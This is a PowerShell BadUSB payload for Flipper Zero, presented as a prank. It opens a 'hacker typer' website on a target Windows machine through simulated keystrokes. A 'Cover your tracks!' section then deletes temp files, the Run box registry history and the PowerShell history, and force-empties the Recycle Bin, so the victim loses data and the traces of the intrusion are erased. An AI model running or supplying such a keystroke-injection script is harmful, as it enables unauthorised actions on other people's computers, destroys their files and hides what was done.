﻿# Hacker-typer By UberGuidoZ Git BadUSB resources -> https://github.com/UberGuidoZ/Flipper/tree/main/BadUSB
# Opens a harmless website and types like a hacker
#
#
# Merged with delayed rickroll by AbeNaws in an attempt create a script which will run after some preset delay
#AbeNAws Git BadUsb resources -> https://github.com/AbeNaws/Flipper-Zero-BadUsb-Scripts
# ###########################################
# #                                         |
# # Title        : Windows Delayed Rickroll |
# # Author       : AbeNaws                  |
# # Version      : 1.0                      |
# # Category     : Prank                    |
# # Target       : Windows                  |
# #                                         |
# ###########################################
#
#Also special thanks to I-Am-Jakoby for his creation of the Jumpscare 2.0 which is where I learned what little I know about .ps1 files.  All of this was borrowed and re-worked to accomplish my goal!
#I-Am-Jakoby Git BadUsb resources -> https://github.com/I-Am-Jakoby/Flipper-Zero-BadUSB
#
#
# Converted to .js and then to .ps1 by Luciferseamus - reason- I wanted to be able to run this but have the option to delay the effect.  I couldn't figure out how to do it via .txt file so I 
# converted it to .js format.  It seemed easier after messing with PS commands for almost an entire weekend. I did learn alot however!  
# I could not have done any of this without inspiration from these three Titans and the entire f0 community. Thanks to all of you for inspiring me to undertake this project.


#This is a clean up testing version just to verify everything is gone once it is through running without having to sit through the whole thing



#Adjust what $d= to change delay and change what $n= to adjust how many times to repeat the script. Currently set 5 seconds & no repeats
$n=1;$d=5;1..$n|%{Start-Sleep -s $d; Start microsoft-edge:'http://geektyper.com/plain'; $wshell = New-Object -ComObject wscript.shell; Sleep 2; $wshell.SendKeys('{f11}'); 
 Sleep 7; $wshell.SendKeys('%{F4}')};


#############################################################################################################################################
#Cover your tracks!

$D="$env:tmp"
cd\
# Delete the zip
rm $D\t.zip* -r -Force -ErrorAction SilentlyContinue

# Delete Wait for mouse .ps1
rm $D\Wm.ps1 -r -Force -ErrorAction SilentlyContinue

# empty temp folder
rm $D\t* -r -Force -ErrorAction SilentlyContinue

# delete run box history
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f

# Delete powershell history
Remove-Item (Get-PSreadlineOption).HistorySavePath

# Empty recycle bin
Clear-RecycleBin -Force -ErrorAction SilentlyContinue